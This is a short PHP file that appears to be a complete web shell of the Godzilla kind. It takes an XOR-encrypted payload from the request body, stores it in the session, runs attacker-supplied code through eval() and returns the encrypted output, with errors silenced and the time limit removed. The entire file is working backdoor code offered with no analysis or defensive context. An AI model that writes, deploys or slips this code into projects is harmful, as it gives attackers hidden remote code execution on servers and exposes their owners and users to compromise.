<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$orange='716f6b30598ba309';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$orange);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$orange);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$orange);
        }
		eval($payload);
        echo encode(@run($data),$orange);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$orange);
        }
    }
}
